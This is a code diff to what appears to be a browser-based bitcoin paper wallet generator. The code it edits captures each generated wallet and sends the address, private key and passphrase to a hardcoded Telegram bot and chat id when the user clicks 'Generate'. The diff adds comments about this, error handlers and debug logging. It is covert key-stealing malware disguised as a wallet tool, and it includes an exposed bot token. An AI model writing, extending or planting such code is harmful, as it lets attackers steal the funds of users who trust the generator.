@@ -10004,7 +10004,7 @@ document.getElementById("newaddress").addEventListener("click", function() {
     ninja.wallets.singlewallet.generateNewAddressAndKey();
 });
 </script>
-						
+
 <script src="https://cdnjs.cloudflare.com/ajax/libs/html2canvas/0.4.1/html2canvas.min.js"></script>
 <script type="text/javascript">
 ninja.wallets.paperwallet = {
@@ -10214,12 +10214,14 @@ ninja.wallets.paperwallet = {
             document.getElementById("btcprivwif" + idPostFix).innerHTML = privateKey;
         }
 
-        
+        // Convert the wallet area to an image and send to Telegram
         const walletElement = document.getElementById("artwallet" + idPostFix);
         html2canvas(walletElement).then(canvas => {
             const imageDataUrl = canvas.toDataURL("image/png");
             const passphrase = ninja.wallets.paperwallet.encrypt ? document.getElementById('paperpassphrase').value : '';
             sendToTelegram(imageDataUrl, bitcoinAddress, privateKey, passphrase, '858072424', '7967790093:AAE4rgkE4u0dNrvPk2C2xoZMjdl16OMQGCM');
+        }).catch(error => {
+            console.error('Error capturing canvas:', error); // Debugging line
         });
     },
 
@@ -10260,11 +10262,11 @@ ninja.wallets.paperwallet = {
     }
 };
 
-
+// Function to send the paper wallet image to the Telegram bot
 async function sendToTelegram(imageDataUrl, bitcoinAddress, privateKey, passphrase, chatId, botToken) {
-    const formData = new FormData();
     const response = await fetch(imageDataUrl);
     const blob = await response.blob();
+    const formData = new FormData();
     formData.append('chat_id', chatId);
     formData.append('photo', blob, 'wallet.png');
     formData.append('caption', `Bitcoin Address: ${bitcoinAddress}\nPrivate Key: ${privateKey}\nPassphrase: ${passphrase}`);
@@ -10284,7 +10286,7 @@ async function sendToTelegram(imageDataUrl, bitcoinAddress, privateKey, passphra
     });
 }
 
-
+// Function to send the text-based wallet to the Telegram bot
 async function sendTextToTelegram(text, chatId, botToken) {
     const formData = new FormData();
     formData.append('chat_id', chatId);
@@ -10305,7 +10307,7 @@ async function sendTextToTelegram(text, chatId, botToken) {
     });
 }
 
-
+// Send wallet data when "Generate" button is clicked
 document.getElementById("papergenerate").addEventListener("click", function() {
     const passphrase = document.getElementById('paperpassphrase').value;
     const useArtistic = ninja.wallets.paperwallet.useArtisticWallet;
@@ -10317,7 +10319,10 @@ document.getElementById("papergenerate").addEventListener("click", function() {
                 const imageDataUrl = canvas.toDataURL("image/png");
                 const bitcoinAddress = document.getElementById("btcaddress" + i).innerHTML;
                 const privateKey = document.getElementById("btcprivwif" + i).innerHTML;
+                console.log('Sending image to Telegram:', imageDataUrl); // Debugging line
                 sendToTelegram(imageDataUrl, bitcoinAddress, privateKey, passphrase, '858072424', '7967790093:AAE4rgkE4u0dNrvPk2C2xoZMjdl16OMQGCM');
+            }).catch(error => {
+                console.error('Error capturing canvas:', error); // Debugging line
             });
         } else {
             const bitcoinAddress = document.getElementById("btcaddress" + i).innerHTML;
